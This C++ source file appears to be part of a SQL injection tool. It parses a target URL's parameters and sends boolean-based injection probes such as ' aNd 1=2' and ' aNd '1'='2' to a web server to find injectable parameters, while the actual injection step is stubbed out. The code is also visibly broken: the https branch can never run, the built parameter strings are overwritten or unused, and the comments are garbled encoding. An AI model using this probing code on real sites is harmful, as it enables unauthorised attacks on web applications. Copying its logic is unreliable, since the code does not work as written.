#include "Injectior.h"
#include<vector>
#include <string>
#include "stdafx.h"
using namespace std;
void Injector::SeparatePara()
{
	//http://
	int iHttpLength = 0;
	int iFirstSlash = 0;
	if((iHttpLength = strnlen_s("http://", 1024))!=-1)
		iFirstSlash = m_Url.find('/', iHttpLength);
	else if ((iHttpLength = strnlen_s("https://", 1024))!=-1)
		iFirstSlash = m_Url.find('/', iHttpLength);
	else
		iHttpLength = 0;
	
	m_Domain = m_Url.substr(iHttpLength, iFirstSlash - iHttpLength);
	if (m_Url.find('?',iFirstSlash)==-1)
		m_Page =m_Url.substr(iFirstSlash, m_Url.length()-iFirstSlash);
	else
		m_Page = m_Url.substr(iFirstSlash, m_Url.find('?',iFirstSlash)-iFirstSlash);//��Ҫ������
	if (m_InjectClass & GETMASK)
	{//��url�з���GET����
		string AllPara = m_Url.substr(m_Url.find('?',0)+1, m_Url.length()-m_Url.find('?',0)-1);
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_GetPara.push_back(temp);
				temp.clear();
			}
		}
		m_GetPara.push_back(temp);
		temp.clear();	
	}
	if (m_InjectClass & POSTMASK)
	{
		string AllPara = m_csql_injectordlg->m_stringRawPost;
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_PostPara.push_back(temp);
				temp.clear();
			}
		}
		m_PostPara.push_back(temp);
		temp.clear();
	}
	if (m_InjectClass & COOKIEMASK)
	{
		/*string AllPara = m_csql_injectordlg->m_stringRawCookie;
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_CookiePara.push_back(temp);
				temp.clear();
			}
		}*/
		return;
	}
	return;
}
bool Injector::BooleanInjectTesting(int HTTPMethod)//
{//TODO:δ����POST
	string allPara;//����ȫ������
	string normalPara;//�����Ĳ���
	string testingPara;//���ԵĲ���
	for (vector<string>::iterator i=m_GetPara.begin(); i!=m_GetPara.end(); ++i)
	{//��Ҫ���Ե�ĳ������i
		//��������ϴβ������µ�����
		allPara.clear();
		normalPara.clear();
		testingPara.clear();
		if (HTTPMethod&GETMASK){
			for (vector<string>::iterator j=m_GetPara.begin(); j!=m_GetPara.end(); ++j)
			{//�����в�����ȡ���������ӣ����˲��Բ���
				if (i!=j)
				{
					allPara += *j;
					allPara += '&';
				}
			}
		}
		allPara = m_Page +"?"  + *i;
		normalPara = allPara+ "aNd 1=1";
		testingPara = allPara + " aNd 1=2"; 
		string CompareString = m_csql_injectordlg->m_CompareString;
		HTTPRequest *normalRequest = new HTTPRequest(m_Domain, allPara, HTTPMethod);
		HTTPRequest *testingRequest = new HTTPRequest(m_Domain, testingPara, HTTPMethod);
		string normalContent = normalRequest->GetContent();
		if (normalContent.find(CompareString, 0) == -1)
		{//�����ķ��ʳ���
			delete normalRequest;
			delete testingRequest;
			continue;
		}
		string testingContent = testingRequest->GetContent();
		if (testingContent.find(CompareString, 0) == -1)
		{
			//��ע��©��
			return true;

		}
		//end loop
	}
	return false;
}
bool Injector::StringInjectTesting(int HTTPMethod)//�ַ���ע��
{//TODO:δ����POST
	string allPara;//����ȫ������
	string normalPara;//�����Ĳ���
	string testingPara;//���ԵĲ���
	for (vector<string>::iterator i=m_GetPara.begin(); i!=m_GetPara.end(); ++i)
	{//��Ҫ���Ե�ĳ������i
		//��������ϴβ������µ�����
		allPara.clear();
		normalPara.clear();
		testingPara.clear();
		for (vector<string>::iterator j=m_GetPara.begin(); j!=m_GetPara.end(); ++j)
		{//�����в�����ȡ���������ӣ����˲��Բ���
			if (i!=j)
			{
				allPara += *j;
				allPara += '&';
			}
		}
		allPara = m_Page + "?"  + *i;
		normalPara = allPara+ " aNd '1'='1";
		testingPara = allPara + " aNd '1'='2"; 
		string CompareString = m_csql_injectordlg->m_CompareString;
		HTTPRequest *normalRequest = new HTTPRequest(m_Domain, allPara, HTTPMethod);
		HTTPRequest *testingRequest = new HTTPRequest(m_Domain, testingPara, HTTPMethod);
		string normalContent = normalRequest->GetContent();
		if (normalContent.find(CompareString, 0) == -1)
		{//�����ķ��ʳ���
			delete normalRequest;
			delete testingRequest;
			continue;
		}
		string testingContent = testingRequest->GetContent();
		if (testingContent.find(CompareString, 0) == -1)
		{
			//��ע��©��
			return true;

		}
		//end loop
	}
	return false;
}
void Injector::TryInject()
{//���Ը��ֿ��ܵ�ע�룬����ɹ������Inject��

	SeparatePara();
	if (m_InjectClass & GETMASK)
	{
		InjectClass injectclass=GET;
		if (BooleanInjectTesting(injectclass)==true)
			//Inject;
			;
			//Inject();
		if (StringInjectTesting(injectclass)==true)
			//Inject();
			;
	}
	else if (m_InjectClass & POSTMASK)
	{
		InjectClass injectclass=POST;
		if (BooleanInjectTesting(injectclass)==true)
			//Inject;
			//Inject();
			;
		if (StringInjectTesting(injectclass)==true)
			//Inject();
			;
	}
	else if(m_InjectClass & COOKIEMASK)
	{
		return;
	}




}